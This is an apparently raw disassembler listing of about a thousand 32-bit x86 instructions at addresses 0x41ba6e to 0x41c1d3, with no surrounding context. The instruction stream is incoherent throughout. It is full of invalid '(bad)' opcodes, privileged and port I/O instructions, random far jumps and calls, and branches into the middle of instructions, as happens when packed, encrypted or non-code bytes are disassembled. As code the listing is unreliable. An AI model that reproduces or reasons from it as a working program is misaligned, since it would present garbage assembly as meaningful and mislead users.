  41ba6e:	mov    ebx,0xd329bd90
  41ba73:	xor    ecx,DWORD PTR ds:0x394864d7
  41ba79:	sahf   
  41ba7a:	add    BYTE PTR [edi+0x7e10c34],0x3d
  41ba81:	push   ss
  41ba82:	les    eax,FWORD PTR [bp+di+0x66e9]
  41ba87:	mov    ah,0x1a
  41ba89:	repz sbb BYTE PTR [eax+0x15ca410c],dl
  41ba90:	ins    DWORD PTR es:[edi],dx
  41ba91:	(bad)  
  41ba93:	sti    
  41ba94:	test   DWORD PTR [ecx+0x5653750e],edx
  41ba9a:	ss push edi
  41ba9c:	or     ebp,edx
  41ba9e:	aam    0x89
  41baa0:	fistp  QWORD PTR [ebx+0x7c]
  41baa3:	das    
  41baa4:	pop    fs
  41baa6:	and    al,0xb5
  41baa8:	jno    0x41ba9a
  41baaa:	push   ecx
  41baab:	(bad)  
  41baad:	outs   dx,DWORD PTR ds:[esi]
  41baae:	movq   QWORD PTR [esi+0x52e73bfb],mm7
  41bab5:	dec    esi
  41bab6:	sahf   
  41bab7:	add    ecx,DWORD PTR [edx-0x4ab8faa1]
  41babd:	push   0x9b3f1c5c
  41bac2:	xchg   ebp,eax
  41bac3:	push   ecx
  41bac4:	aas    
  41bac5:	pop    es
  41bac6:	ror    bl,1
  41bac8:	(bad)  
  41bac9:	cmp    DWORD PTR [ecx+eiz*1-0x56],edi
  41bacd:	cmp    BYTE PTR [edi-0x7b9f1d0d],0x7c
  41bad4:	sti    
  41bad5:	inc    ebx
  41bad6:	fimul  WORD PTR [eax+0xb48ad5a]
  41badc:	out    dx,al
  41badd:	rcl    edx,cl
  41badf:	add    DWORD PTR ds:0x409821e1,ecx
  41bae5:	pop    ebx
  41bae6:	push   0xfffffff2
  41bae8:	push   0x2b
  41baea:	hlt    
  41baeb:	dec    esi
  41baec:	(bad)  
  41baed:	iret   
  41baee:	je     0x41ba9b
  41baf0:	in     eax,dx
  41baf1:	jl     0x41bb09
  41baf3:	inc    esi
  41baf4:	mov    ds:0x5b3c584d,eax
  41baf9:	xchg   esi,eax
  41bafa:	mov    dh,0x3e
  41bafc:	out    0xfe,al
  41bafe:	ins    BYTE PTR es:[edi],dx
  41baff:	sub    DWORD PTR [esi+0x2c],ebp
  41bb02:	push   es
  41bb03:	or     bh,BYTE PTR ds:0x2f878d02
  41bb09:	mov    ebp,0x4252d2c9
  41bb0e:	inc    ebp
  41bb0f:	aaa    
  41bb10:	pop    esi
  41bb11:	test   al,0xad
  41bb13:	shr    dh,1
  41bb15:	jno    0x41bb53
  41bb17:	enter  0xc5ae,0x54
  41bb1b:	xor    eax,0x2b2495b9
  41bb20:	sbb    al,0x58
  41bb22:	sub    BYTE PTR [ecx],ch
  41bb24:	mov    WORD PTR [esi-0x4a173461],cs
  41bb2a:	jns    0x41bb0b
  41bb2c:	rcr    DWORD PTR [esp+eiz*8-0x20],cl
  41bb30:	jnp    0x41bb98
  41bb32:	js     0x41bb91
  41bb34:	(bad)  
  41bb35:	sub    ebx,ecx
  41bb37:	sar    BYTE PTR [edi],0xac
  41bb3a:	jmp    0x41bbad
  41bb3c:	mov    ch,0xbc
  41bb3e:	add    BYTE PTR [ecx],ah
  41bb40:	xchg   ecx,eax
  41bb41:	adc    eax,0xcc4010c3
  41bb46:	sub    eax,0x77f38c8a
  41bb4b:	add    ah,0x2a
  41bb4e:	lea    ecx,[edx-0x7fc09d95]
  41bb54:	pop    ecx
  41bb55:	mov    ds:0x3b5dd6b,eax
  41bb5a:	jne    0x41bb57
  41bb5c:	aad    0xa0
  41bb5e:	pop    ecx
  41bb5f:	cmp    edx,DWORD PTR [esi]
  41bb61:	xchg   BYTE PTR [esi+0x6ec8d71d],al
  41bb67:	dec    ecx
  41bb68:	fldln2 
  41bb6a:	inc    esp
  41bb6b:	jl     0x41bbb4
  41bb6d:	cmp    ecx,DWORD PTR [ecx]
  41bb6f:	mov    ds:0x12b39ce3,eax
  41bb74:	dec    edx
  41bb75:	add    eax,0x48258e68
  41bb7a:	sbb    BYTE PTR [ecx+0x3e],0xe3
  41bb7e:	cmp    bl,ch
  41bb80:	inc    ecx
  41bb81:	fld    TBYTE PTR [ecx+0x41]
  41bb84:	add    dx,0x7d
  41bb88:	xlat   BYTE PTR ds:[ebx]
  41bb89:	shr    BYTE PTR ss:[edi+eax*4-0x2],1
  41bb8e:	mov    ah,0xe
  41bb90:	ret    
  41bb91:	sbb    DWORD PTR [esi-0xd343cd2],edi
  41bb97:	sbb    ebp,ecx
  41bb99:	mov    eax,ds:0x65ebd4bc
  41bb9e:	xchg   ebx,eax
  41bb9f:	rcr    eax,cl
  41bba1:	push   ds
  41bba2:	je     0x41bbe8
  41bba4:	in     eax,0x3a
  41bba6:	js     0x41bba5
  41bba8:	shr    bl,0x36
  41bbab:	push   edi
  41bbac:	not    DWORD PTR [ebx-0x5a00d5ea]
  41bbb2:	imul   eax,DWORD PTR [ecx+ebx*2-0x7d],0xffffff8a
  41bbb7:	cli    
  41bbb8:	push   edx
  41bbb9:	into   
  41bbba:	cli    
  41bbbb:	mov    ds:0x2fa76f1d,eax
  41bbc0:	popa   
  41bbc1:	pop    edi
  41bbc2:	inc    edi
  41bbc3:	xchg   edx,eax
  41bbc4:	push   eax
  41bbc5:	ins    DWORD PTR es:[edi],dx
  41bbc6:	xchg   ecx,eax
  41bbc7:	icebp  
  41bbc8:	push   cs
  41bbc9:	mov    dh,0x79
  41bbcb:	xchg   ebx,eax
  41bbcc:	outs   dx,BYTE PTR ds:[esi]
  41bbcd:	cmp    eax,0x941a868e
  41bbd2:	stos   BYTE PTR es:[edi],al
  41bbd3:	sar    BYTE PTR [edi+0x56],cl
  41bbd6:	imul   esp
  41bbd8:	int    0xd1
  41bbda:	sub    ah,BYTE PTR [eax]
  41bbdc:	int3   
  41bbdd:	sbb    BYTE PTR [ecx],0xa0
  41bbe0:	jg     0x41bba7
  41bbe2:	xor    BYTE PTR [edi-0x39],0x5e
  41bbe6:	(bad)  
  41bbe7:	clc    
  41bbe8:	sub    DWORD PTR [edi+0x56],ebp
  41bbeb:	dec    eax
  41bbec:	adc    DWORD PTR [esp+eax*1-0x1a7fc717],esp
  41bbf3:	push   0x972562cd
  41bbf8:	inc    ecx
  41bbf9:	push   edi
  41bbfa:	mov    ebp,0x3991fb0e
  41bbff:	ret    0xee75
  41bc02:	loope  0x41bc41
  41bc04:	popa   
  41bc05:	xor    esp,DWORD PTR [edx+esi*4+0x613465bd]
  41bc0c:	mov    eax,0xfe0a9df8
  41bc11:	xor    edx,DWORD PTR [ebx-0x9]
  41bc14:	push   0xc0b13d2d
  41bc19:	in     al,0xa8
  41bc1b:	pop    ecx
  41bc1c:	bound  esi,QWORD PTR [edi]
  41bc1e:	ds jl  0x41bc46
  41bc21:	test   al,0xc9
  41bc23:	loopne 0x41bc22
  41bc25:	scas   eax,DWORD PTR es:[edi]
  41bc26:	jnp    0x41bbe3
  41bc28:	sub    eax,0x33fdd5c5
  41bc2d:	jl     0x41bbc3
  41bc2f:	jl     0x41bbe5
  41bc31:	les    ebp,FWORD PTR [ebp+0x38155283]
  41bc37:	and    al,0x29
  41bc39:	aam    0xd8
  41bc3b:	dec    edi
  41bc3c:	xor    bh,BYTE PTR [esi+0x57]
  41bc3f:	dec    esi
  41bc40:	nop
  41bc41:	cli    
  41bc42:	scas   eax,DWORD PTR es:[edi]
  41bc43:	jmp    0x37e8e969
  41bc48:	pop    edi
  41bc49:	fistp  WORD PTR [ebp+0x63]
  41bc4c:	cmp    BYTE PTR [eax-0x6a7064b3],cl
  41bc52:	cld    
  41bc53:	neg    BYTE PTR [ebp-0x57]
  41bc56:	sbb    al,0x29
  41bc58:	std    
  41bc59:	cmp    bh,dh
  41bc5b:	sahf   
  41bc5c:	mov    dl,ah
  41bc5e:	lods   eax,DWORD PTR ds:[esi]
  41bc5f:	bound  ebp,QWORD PTR [ebx-0x4f]
  41bc62:	js     0x41bcae
  41bc64:	das    
  41bc65:	jne    0x41bc48
  41bc67:	dec    ebx
  41bc68:	fs dec edi
  41bc6a:	mov    edi,0xe6e4121c
  41bc6f:	or     ecx,DWORD PTR [ebp-0x2a]
  41bc72:	test   dh,ah
  41bc74:	jle    0x41bc68
  41bc76:	push   ebx
  41bc77:	shl    DWORD PTR [edx-0x4e6815af],cl
  41bc7d:	mov    eax,ds:0x68aec15d
  41bc82:	loop   0x41bc0b
  41bc84:	fmul   st,st(2)
  41bc86:	ins    DWORD PTR es:[edi],dx
  41bc87:	scas   eax,DWORD PTR es:[edi]
  41bc88:	pop    es
  41bc89:	in     al,dx
  41bc8a:	sbb    eax,0x1449d0c
  41bc8f:	fwait
  41bc90:	mov    eax,0x9fa5c7b
  41bc95:	mov    edx,DWORD PTR [esi-0x7d451ae2]
  41bc9b:	sbb    dh,BYTE PTR [eax]
  41bc9d:	cmp    eax,0x2fd8825f
  41bca2:	bound  ebx,QWORD PTR [eax]
  41bca4:	xchg   ebx,eax
  41bca5:	jecxz  0x41bd0c
  41bca7:	cld    
  41bca8:	ds or  ebx,ecx
  41bcab:	outs   dx,BYTE PTR ds:[esi]
  41bcac:	and    eax,0x724ac3a1
  41bcb1:	adc    bl,BYTE PTR [esi-0x5e]
  41bcb4:	pusha  
  41bcb5:	mov    ch,0x76
  41bcb7:	popa   
  41bcb8:	mov    es,WORD PTR [ecx]
  41bcba:	stc    
  41bcbb:	lock xlat BYTE PTR ds:[ebx]
  41bcbd:	bound  esp,QWORD PTR [ebp-0x2725a9c2]
  41bcc3:	popa   
  41bcc4:	xor    al,0xfc
  41bcc6:	stos   BYTE PTR es:[edi],al
  41bcc7:	mov    ebp,0x1eadef14
  41bccc:	rcl    BYTE PTR [ecx-0x26],1
  41bccf:	xchg   edi,eax
  41bcd0:	push   edi
  41bcd1:	pusha  
  41bcd2:	sbb    bl,al
  41bcd4:	inc    ebp
  41bcd5:	cmp    eax,0xc8c46efc
  41bcda:	dec    esi
  41bcdb:	sar    DWORD PTR ds:0x61b55f70,1
  41bce1:	jnp    0x41bd5d
  41bce3:	xchg   edx,eax
  41bce4:	in     al,dx
  41bce5:	push   ebp
  41bce6:	mov    eax,ds:0xdc5c5dd6
  41bceb:	hlt    
  41bcec:	mov    ebp,0x9c899561
  41bcf1:	imul   eax,DWORD PTR [ecx+0x1b74d538],0xaeff9691
  41bcfb:	cmp    BYTE PTR [eax],bl
  41bcfd:	shl    al,1
  41bcff:	cmp    eax,DWORD PTR [edx+0x2a]
  41bd02:	adc    BYTE PTR [edi+0x295b2f45],dl
  41bd08:	jno    0x41bd3e
  41bd0a:	mov    ds:0x37ac5ecd,eax
  41bd0f:	jno    0x41bce7
  41bd11:	pushf  
  41bd12:	aam    0x1f
  41bd14:	mov    esi,0x22d8e840
  41bd19:	mov    ecx,0xac71df34
  41bd1e:	dec    edx
  41bd1f:	neg    DWORD PTR [ebp+0x2642e1f6]
  41bd25:	std    
  41bd26:	push   edi
  41bd27:	cwde   
  41bd28:	cmp    ecx,DWORD PTR [ebx-0x47e5d927]
  41bd2e:	or     al,0x46
  41bd30:	test   eax,0x77c6e001
  41bd35:	(bad)  
  41bd36:	or     eax,0x49a43c19
  41bd3b:	(bad)  [edi-0x80]
  41bd3e:	or     DWORD PTR [edi-0x4e],edi
  41bd41:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd43:	xor    eax,0x5cb1892c
  41bd48:	into   
  41bd49:	add    ah,bh
  41bd4b:	push   ds
  41bd4c:	or     BYTE PTR [edi],cl
  41bd4e:	mov    ch,0xfb
  41bd50:	adc    dl,bl
  41bd52:	mov    eax,ds:0x22093b69
  41bd57:	test   ch,bl
  41bd59:	mov    eax,ds:0x6c12a088
  41bd5e:	or     al,0x7b
  41bd60:	xor    al,0x62
  41bd62:	pushf  
  41bd63:	pop    esp
  41bd64:	sbb    al,0x5c
  41bd66:	jg     0x41bd36
  41bd68:	out    dx,al
  41bd69:	dec    ebx
  41bd6a:	sahf   
  41bd6b:	scas   eax,DWORD PTR es:[edi]
  41bd6c:	sub    cl,BYTE PTR [ebx-0x59cfd898]
  41bd72:	dec    esp
  41bd73:	sub    DWORD PTR [esi+0x52],esp
  41bd76:	rcr    DWORD PTR [ecx-0x617120a4],cl
  41bd7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd7d:	add    BYTE PTR ds:0xafb345f7,cl
  41bd83:	sub    BYTE PTR [edx+eiz*1+0x70],bh
  41bd87:	fcom   QWORD PTR [edi]
  41bd89:	jb     0x41bd87
  41bd8b:	hlt    
  41bd8c:	sub    al,0xda
  41bd8e:	int    0x92
  41bd90:	lea    ebx,[eax+0x4c]
  41bd93:	adc    al,0xcd
  41bd95:	cmp    al,BYTE PTR [esi+esi*4+0xc]
  41bd99:	test   al,0x70
  41bd9b:	aad    0xe2
  41bd9d:	jmp    0x67c13295
  41bda2:	out    0xd0,eax
  41bda4:	std    
  41bda5:	in     al,0xc1
  41bda7:	in     eax,0x6a
  41bda9:	adc    BYTE PTR [ecx-0x1c],dh
  41bdac:	mov    ah,0xe7
  41bdae:	popf   
  41bdaf:	ins    DWORD PTR es:[edi],dx
  41bdb0:	push   ebp
  41bdb1:	mov    ebx,DWORD PTR [edx-0x701edd2a]
  41bdb7:	dec    esi
  41bdb8:	mov    ebx,DWORD PTR [esi]
  41bdba:	rcl    BYTE PTR [eax+ebp*4],0xed
  41bdbe:	sbb    ah,ch
  41bdc0:	or     al,0xfd
  41bdc2:	cmc    
  41bdc3:	repnz in ax,0xb6
  41bdc7:	adc    al,0xb9
  41bdc9:	mov    ch,BYTE PTR [edi]
  41bdcb:	add    BYTE PTR [ebp+0x6c615fa5],dh
  41bdd1:	xor    eax,0x7def7b19
  41bdd6:	js     0x41bdb7
  41bdd8:	fnstenv [eax+0x39]
  41bddb:	aad    0x6b
  41bddd:	dec    edx
  41bdde:	addr16 sub ch,cl
  41bde1:	outs   dx,BYTE PTR ds:[esi]
  41bde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bde3:	(bad)  [eax-0x5a674c0]
  41bde9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdea:	mov    ebx,0x2cb584cb
  41bdef:	push   eax
  41bdf0:	mov    dl,0x60
  41bdf2:	cmp    esi,0xffffffae
  41bdf5:	mov    ah,0xc0
  41bdf7:	int    0xf3
  41bdf9:	push   es
  41bdfa:	retf   0x88c4
  41bdfd:	cmp    dh,BYTE PTR [ecx-0x78780ee2]
  41be03:	mov    dl,0xf3
  41be05:	je     0x41bda3
  41be07:	test   DWORD PTR [eax],ebx
  41be09:	or     eax,0xf4de3e29
  41be0e:	sbb    BYTE PTR [ecx],bh
  41be10:	push   eax
  41be11:	icebp  
  41be12:	mov    esi,cs
  41be14:	fisubr WORD PTR ds:[esi-0x4ed52cf4]
  41be1b:	cpuid  
  41be1d:	xor    BYTE PTR [edx+0x14],al
  41be20:	pop    esi
  41be21:	pop    esp
  41be22:	cmp    eax,0xe8076a31
  41be27:	fisttp DWORD PTR [edx-0x77]
  41be2a:	xor    al,0x26
  41be2c:	push   ds
  41be2d:	fdiv   DWORD PTR [edx]
  41be2f:	scas   eax,DWORD PTR es:[edi]
  41be30:	out    dx,al
  41be31:	xchg   DWORD PTR [edx+ebx*1],esp
  41be34:	or     al,0x55
  41be36:	jae    0x41be79
  41be38:	sahf   
  41be39:	pop    edx
  41be3a:	test   DWORD PTR [edi-0x28],esp
  41be3d:	cmp    al,0x9c
  41be3f:	dec    ebx
  41be40:	mov    esp,0xcc4ffcb8
  41be45:	sub    al,BYTE PTR [edi-0x1fc16d22]
  41be4b:	ficom  WORD PTR [ebp+0x4958acc]
  41be51:	pop    es
  41be52:	xor    bl,BYTE PTR [ecx-0x77f57246]
  41be58:	mov    dl,0x49
  41be5a:	scas   eax,DWORD PTR es:[edi]
  41be5b:	and    ecx,DWORD PTR [ebx+0x57822262]
  41be61:	dec    edi
  41be62:	out    0x43,eax
  41be64:	xor    eax,0x97be9c50
  41be69:	test   BYTE PTR [edi],dh
  41be6b:	outs   dx,BYTE PTR ds:[esi]
  41be6c:	mov    ah,0x9b
  41be6e:	daa    
  41be6f:	sbb    eax,0xc8d958d4
  41be74:	bound  ecx,QWORD PTR gs:[ebp+0x14]
  41be78:	jb     0x41be82
  41be7a:	mov    ebp,0x9fb5646e
  41be7f:	add    DWORD PTR [edx+0x51],eax
  41be82:	jno    0x41be34
  41be84:	fnstcw WORD PTR [eax]
  41be86:	or     eax,DWORD PTR [esi]
  41be88:	sub    al,0xc6
  41be8a:	leave  
  41be8b:	or     DWORD PTR [ecx-0x67],edx
  41be8e:	repz add BYTE PTR [ebp+0x61c749b5],bl
  41be95:	sbb    bl,BYTE PTR [edi+ebx*2+0x6abc4a5d]
  41be9c:	pop    ebp
  41be9d:	sti    
  41be9e:	mov    eax,ds:0x37af09
  41bea3:	iret   
  41bea4:	mul    BYTE PTR [ebx-0x3675c7c5]
  41beaa:	xchg   DWORD PTR [edi],edx
  41beac:	jmp    0x934da99f
  41beb1:	jno    0x41beb0
  41beb3:	repz loop 0x41bef2
  41beb6:	inc    edi
  41beb7:	jb     0x41be90
  41beb9:	fild   DWORD PTR [edi-0xc792c34]
  41bebf:	and    eax,ecx
  41bec1:	fwait
  41bec2:	popa   
  41bec3:	shl    DWORD PTR [esi+eax*8+0x52],0x34
  41bec8:	pop    ss
  41bec9:	lods   al,BYTE PTR ds:[esi]
  41beca:	pop    ss
  41becb:	fisttp DWORD PTR [ecx+0x247f96a3]
  41bed1:	xchg   esp,eax
  41bed2:	cwde   
  41bed3:	cmp    ebx,ebp
  41bed5:	mov    ebp,0x7c3d4556
  41beda:	add    DWORD PTR [eax+0x68],0xb260c5cf
  41bee1:	jbe    0x41beb3
  41bee3:	sub    bh,BYTE PTR ds:0x42fca17f
  41bee9:	mov    eax,0x3f26440c
  41beee:	ins    BYTE PTR es:[edi],dx
  41beef:	mov    ecx,0xe7faf1a4
  41bef4:	outs   dx,DWORD PTR ds:[esi]
  41bef5:	adc    edx,DWORD PTR [ebx+0x8886116]
  41befb:	das    
  41befc:	and    BYTE PTR [edi],cl
  41befe:	push   ebx
  41beff:	addr16 mov al,0x2b
  41bf02:	out    0x4e,eax
  41bf04:	addr16 xchg esi,eax
  41bf06:	cmp    ebx,DWORD PTR [ebx+0x1f]
  41bf09:	sub    DWORD PTR [ebx+0x57],esp
  41bf0c:	add    edx,ebx
  41bf0e:	pop    eax
  41bf0f:	mov    ebx,0xf97c8482
  41bf14:	inc    edi
  41bf15:	mov    al,ds:0xb751086a
  41bf1a:	adc    eax,0xa5e8e365
  41bf1f:	add    edi,DWORD PTR [edi-0x39c6dea4]
  41bf25:	js     0x41bf1f
  41bf27:	in     al,dx
  41bf28:	mov    dh,0x9e
  41bf2a:	inc    edi
  41bf2b:	call   0x2dd6:0x125b335d
  41bf32:	add    eax,0xbea10d1
  41bf37:	data16 mov cl,0x62
  41bf3a:	cmc    
  41bf3b:	loop   0x41bf6f
  41bf3d:	push   edi
  41bf3e:	xor    BYTE PTR [esi],bh
  41bf40:	stos   BYTE PTR es:[edi],al
  41bf41:	dec    esi
  41bf42:	pop    esp
  41bf43:	mov    al,0x44
  41bf45:	stos   DWORD PTR es:[edi],eax
  41bf46:	inc    edx
  41bf47:	packsswb mm1,mm0
  41bf4a:	adc    esi,ebp
  41bf4c:	xchg   ecx,eax
  41bf4d:	ret    0x310
  41bf50:	pop    es
  41bf51:	push   eax
  41bf52:	fstp   TBYTE PTR [ebx+0x75]
  41bf55:	pop    ebx
  41bf56:	nop
  41bf57:	pop    edi
  41bf58:	push   eax
  41bf59:	jmp    0x9ff8d769
  41bf5e:	dec    eax
  41bf5f:	sub    dh,BYTE PTR [bp+di]
  41bf62:	sub    al,cl
  41bf64:	bswap  ebx
  41bf66:	into   
  41bf67:	push   edx
  41bf68:	jne    0x41bfe9
  41bf6a:	sbb    ebx,DWORD PTR [edi-0x1af07321]
  41bf70:	mov    ecx,0xfd545c9e
  41bf75:	ret    
  41bf76:	cli    
  41bf77:	mov    ch,0x47
  41bf79:	mov    bh,0xc6
  41bf7b:	jecxz  0x41bfce
  41bf7d:	mov    WORD PTR [edx+ecx*1+0x1c],cs
  41bf81:	bound  esp,QWORD PTR [edi]
  41bf83:	enter  0xda59,0x38
  41bf87:	xchg   esi,eax
  41bf88:	lods   eax,DWORD PTR ds:[esi]
  41bf89:	pop    es
  41bf8a:	repz popf 
  41bf8c:	out    0x72,al
  41bf8e:	inc    ebp
  41bf8f:	inc    edx
  41bf90:	mov    ds:0x3d2986f8,al
  41bf95:	and    eax,0xf92e069e
  41bf9a:	jecxz  0x41bfd7
  41bf9c:	test   al,0xe2
  41bf9e:	jb     0x41bf67
  41bfa0:	mov    esp,0xe1eab380
  41bfa5:	add    eax,0x6399932
  41bfaa:	mov    ebx,0xa2b1e792
  41bfaf:	inc    edx
  41bfb0:	in     al,0x5e
  41bfb2:	popf   
  41bfb3:	jmp    0x41bf58
  41bfb5:	mov    ch,0x96
  41bfb7:	inc    edx
  41bfb8:	add    eax,0x5f1007f0
  41bfbd:	pusha  
  41bfbe:	out    0x26,eax
  41bfc0:	sbb    edx,DWORD PTR [eax-0x7e]
  41bfc3:	sbb    eax,0xa8b454d3
  41bfc8:	cdq    
  41bfc9:	push   esi
  41bfca:	out    0x3a,eax
  41bfcc:	aam    0x6c
  41bfce:	cmp    BYTE PTR [ebp-0x290d653b],bl
  41bfd4:	or     al,bl
  41bfd6:	push   eax
  41bfd7:	jno    0x41c034
  41bfd9:	adc    DWORD PTR [ebp-0x1d],ecx
  41bfdc:	cmp    ebp,eax
  41bfde:	popf   
  41bfdf:	adc    eax,0x130aaf15
  41bfe4:	inc    eax
  41bfe5:	add    ecx,DWORD PTR [esi+0x753d6f44]
  41bfeb:	cwde   
  41bfec:	scas   al,BYTE PTR es:[edi]
  41bfed:	cs retf 
  41bfef:	sub    esp,esi
  41bff1:	lods   al,BYTE PTR ds:[esi]
  41bff2:	ret    0xad6
  41bff5:	xchg   esp,eax
  41bff6:	pop    eax
  41bff7:	ins    BYTE PTR es:[edi],dx
  41bff8:	cli    
  41bff9:	cli    
  41bffa:	mov    dh,0xd6
  41bffc:	mov    esi,0x1e582a8
  41c001:	adc    eax,0xfaa219f4
  41c006:	cmp    ah,BYTE PTR [eax+0x6d]
  41c009:	hlt    
  41c00a:	adc    ebp,DWORD PTR [ebx+0x1fb3e6f8]
  41c010:	jne    0x41c063
  41c012:	and    BYTE PTR [edi+0xafb0c4c],al
  41c018:	ror    BYTE PTR [ebp-0x53259691],0x96
  41c01f:	pop    ds
  41c020:	xor    eax,0xdc391edb
  41c025:	cmp    al,0xc9
  41c027:	scas   eax,DWORD PTR es:[edi]
  41c028:	push   eax
  41c029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c02a:	inc    BYTE PTR [edx+eax*2-0x1eb342a7]
  41c031:	or     DWORD PTR [edi+0x56dc7b43],ebp
  41c037:	mov    ebx,0x14c35fe9
  41c03d:	xor    esp,DWORD PTR [eax+0x62]
  41c040:	cwde   
  41c041:	ins    DWORD PTR es:[edi],dx
  41c042:	into   
  41c043:	lock ficomp DWORD PTR [eax+0x247765dd]
  41c04a:	pusha  
  41c04b:	push   edi
  41c04c:	in     al,0x23
  41c04e:	push   ebp
  41c04f:	cmp    DWORD PTR [eax+0xf],ebx
  41c052:	aam    0xd8
  41c054:	sub    al,0x90
  41c056:	in     al,0xc0
  41c058:	or     BYTE PTR [ebp+0x7c0fea10],bh
  41c05e:	cmc    
  41c05f:	or     ah,BYTE PTR [esi]
  41c061:	call   0xf178f188
  41c066:	xchg   ebp,eax
  41c068:	lock ins DWORD PTR es:[edi],dx
  41c06a:	imul   ch
  41c06c:	sar    DWORD PTR [edi-0x7802880d],1
  41c072:	(bad)  
  41c073:	and    bl,dl
  41c075:	inc    edx
  41c076:	mov    ebx,0x1f414c09
  41c07b:	in     al,dx
  41c07c:	and    dh,dl
  41c07e:	xchg   esp,eax
  41c07f:	or     eax,0xf6b7bd8a
  41c084:	inc    esp
  41c085:	pop    ecx
  41c086:	pop    esp
  41c087:	push   ecx
  41c088:	jmp    0x306c:0x63ffb658
  41c08f:	outs   dx,BYTE PTR ds:[esi]
  41c090:	out    0x13,al
  41c092:	aad    0xb0
  41c094:	in     eax,dx
  41c095:	mov    cs,WORD PTR [edx-0xd]
  41c098:	jl     0x41c0e2
  41c09a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c09b:	and    eax,0x6d9bac87
  41c0a0:	xchg   esp,eax
  41c0a1:	pop    ecx
  41c0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a3:	push   0x67
  41c0a5:	sahf   
  41c0a6:	rcr    BYTE PTR [edx],cl
  41c0a8:	and    eax,0x4e2f4685
  41c0ad:	fcmove st,st(0)
  41c0af:	sbb    bh,BYTE PTR [ebx-0xb]
  41c0b2:	outs   dx,DWORD PTR ds:[esi]
  41c0b3:	pop    ebx
  41c0b4:	lock mov bl,0xfd
  41c0b7:	ins    DWORD PTR es:[edi],dx
  41c0b8:	xchg   BYTE PTR [edx+0x1d],bh
  41c0bb:	inc    ecx
  41c0bc:	and    al,0x91
  41c0be:	jl     0x41c079
  41c0c0:	cmp    dl,dl
  41c0c2:	lods   eax,DWORD PTR ds:[esi]
  41c0c3:	push   ebx
  41c0c4:	nop
  41c0c5:	imul   eax,ecx,0x2fabc9d2
  41c0cb:	lahf   
  41c0cc:	(bad)  
  41c0cd:	call   0x67bb:0x7e32f421
  41c0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0d5:	fs jp  0x41c0b4
  41c0d8:	std    
  41c0d9:	xchg   esi,eax
  41c0da:	int3   
  41c0db:	stc    
  41c0dc:	push   cs
  41c0dd:	and    al,0x89
  41c0df:	or     ebp,esp
  41c0e1:	cli    
  41c0e2:	jge    0x41c091
  41c0e4:	je     0x41c0d6
  41c0e6:	push   esp
  41c0e7:	out    0xb3,al
  41c0e9:	xchg   ebp,eax
  41c0ea:	mov    bh,dl
  41c0ec:	sub    bh,BYTE PTR [ebp+0x41]
  41c0ef:	dec    ecx
  41c0f0:	pop    es
  41c0f1:	pop    ecx
  41c0f2:	or     DWORD PTR [eax],0xed51bd4d
  41c0f8:	je     0x41c173
  41c0fa:	mov    al,ds:0xedc25fc
  41c0ff:	div    BYTE PTR [ebx-0x79]
  41c102:	xor    ch,BYTE PTR [edx+eax*8]
  41c105:	mov    eax,0xbee581d
  41c10a:	push   ebp
  41c10b:	fcmovnb st,st(3)
  41c10d:	fdivr  DWORD PTR [edx-0x2485a2ac]
  41c113:	fcmovnu st,st(7)
  41c115:	push   edx
  41c116:	fadd   st(2),st
  41c118:	push   ebp
  41c119:	or     al,BYTE PTR [edx+0x7612192f]
  41c11f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c120:	retf   0x4564
  41c123:	leave  
  41c124:	jnp    0x41c0ef
  41c126:	inc    ecx
  41c127:	jmp    0x4979:0x7d2dc617
  41c12e:	sub    BYTE PTR [esi+0x48e619ba],dl
  41c134:	inc    esi
  41c135:	clc    
  41c136:	js     0x41c119
  41c138:	and    esi,ebp
  41c13a:	inc    ecx
  41c13b:	xor    BYTE PTR [edi+0x2bcbe699],bl
  41c141:	pushf  
  41c142:	stos   BYTE PTR es:[edi],al
  41c143:	dec    esi
  41c144:	dec    ebx
  41c145:	in     al,dx
  41c146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c147:	loop   0x41c149
  41c149:	dec    ebx
  41c14a:	loop   0x41c145
  41c14c:	shr    DWORD PTR ds:0xf9cf0b65,1
  41c152:	fxch   st(1)
  41c154:	popa   
  41c155:	ss arpl cx,si
  41c158:	pop    ds
  41c159:	ror    DWORD PTR [ebx-0x98afdb3],cl
  41c15f:	jo     0x41c0fb
  41c161:	mov    bh,0xd1
  41c163:	and    al,0x17
  41c165:	mov    ecx,0x4df73252
  41c16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c16b:	sti    
  41c16c:	js     0x41c1d0
  41c16e:	and    eax,0xc5c35be3
  41c173:	icebp  
  41c174:	push   cs
  41c175:	stc    
  41c176:	push   ds
  41c177:	mov    edx,0x434ef6d1
  41c17c:	sbb    al,0xe4
  41c17e:	push   edx
  41c17f:	in     eax,dx
  41c180:	lods   eax,DWORD PTR ds:[esi]
  41c181:	and    BYTE PTR [edi],bh
  41c183:	nop
  41c184:	repnz push esi
  41c186:	cmc    
  41c187:	jp     0x41c13b
  41c189:	call   0x9fe8:0x7745ce0f
  41c190:	loopne 0x41c124
  41c192:	shr    BYTE PTR ds:0x85bc33e0,cl
  41c198:	jg     0x41c1ca
  41c19a:	push   edi
  41c19b:	push   esi
  41c19c:	add    al,0xab
  41c19e:	pop    ebp
  41c19f:	ja     0x41c1b7
  41c1a1:	(bad)  [edi-0x80]
  41c1a4:	fisttp WORD PTR [edx-0x769460cd]
  41c1aa:	jno    0x41c1b6
  41c1ac:	aas    
  41c1ad:	jg     0x41c1a5
  41c1af:	cmp    dh,ah
  41c1b1:	int    0xb8
  41c1b3:	in     al,dx
  41c1b4:	ins    BYTE PTR es:[edi],dx
  41c1b5:	pop    esp
  41c1b6:	push   ds
  41c1b7:	or     esi,esi
  41c1b9:	in     eax,dx
  41c1ba:	mov    ds:0x9dc97f51,eax
  41c1bf:	xor    ebp,edi
  41c1c1:	ss pop esp
  41c1c3:	mov    edi,0x91222762
  41c1c8:	push   ebx
  41c1c9:	enter  0x5dd4,0xfa
  41c1cd:	test   DWORD PTR [edi-0x6ef52859],ebx
  41c1d3:	aaa    
